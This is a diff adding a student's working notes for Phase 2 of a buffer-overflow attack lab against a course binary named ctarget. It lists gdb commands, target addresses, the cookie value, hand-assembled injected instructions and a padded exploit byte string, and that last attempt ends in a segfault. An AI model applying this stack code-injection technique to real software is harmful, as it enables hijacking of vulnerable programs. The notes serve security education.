@@ -44,3 +44,41 @@ Type string:Touch1!: You called touch1()
 Valid solution for level 1 with target ctarget
 PASS: Sent exploit string to server to be validated.
 NICE JOB!
+
+
+
+
+
+Phase 2:
+gdb ./ctarget -i str.txt
+b getbuf 
+cat str.txt | ./hex2raw | ./ctarget
+
+Starting address for touch2:
+0x000000000040186b
+6b 18 40 00 00 00 00 00
+
+Need to write cookie value into rdi
+0x54756825 cookie
+25 68 75 54
+
+instructions to perform:
+mov $0x54756825,%rdi
+pushq $0x40186b
+ret 
+->
+48 c7 c7 25 68 75 54
+68 6b 18 40 00
+c3
+
+address of rsp at start of getbuf
+(gdb) p/x $rsp
+$1 = 0x55638800
+00 88 63 55 
+
+combine to fill space and set return addresses
+48 c7 c7 25 68 75 54 68 6b 18 40 00 c3 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 88 63 55 00 00 00 00 -> seg fault
